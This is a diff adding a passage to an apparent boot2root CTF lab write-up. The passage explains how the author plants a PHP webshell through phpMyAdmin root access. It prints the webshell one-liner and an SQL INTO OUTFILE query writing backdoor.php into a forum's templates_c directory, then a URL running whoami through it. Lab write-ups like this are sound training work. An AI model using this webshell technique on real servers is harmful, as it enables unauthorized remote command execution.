@@ -151,3 +151,24 @@ We gained access to phpmyadmin and the Forum Database.
 <p align="center">
   <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/forum_db.png">
 </p>
+
+Now I need to find out on how I can establish a reverse shell on the Server with the DB root account.
+I stumbled across this guide here: [Shell Uploading Server Phpmyadmin](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/)
+
+It did gave me some hints on how the attack is performed, but the article is not really explaining on how or what exactly we are exploiting. We are basically creating a backdoor in order to launch a Webshell in our case via the Forum. This technique described in the article is mostly used through a SQL injection attack, which we luckily do not need to perform as we have full access to the DB root account. We will create a Webshell with the help of PHP, which parameters will be passed by `cmd` and wil be executed.
+
+```
+<?system($_REQUEST['cmd']);?>
+```
+
+I will create a filed inside the `templates_c` directory, which is created by default while setting up my little forum: [My Little Forum Github Source Code](https://github.com/ilosuna/mylittleforum) <br>
+That directory does have usually excessive permissions.
+The SQL query will look like this:
+```
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"
+```
+The query went through successfully!
+Okay, let's check if we can execute any shell commands with the following crafted URL:
+```
+https://<IP>/forum/templates_c/backdoor.php?cmd=whoami
+```
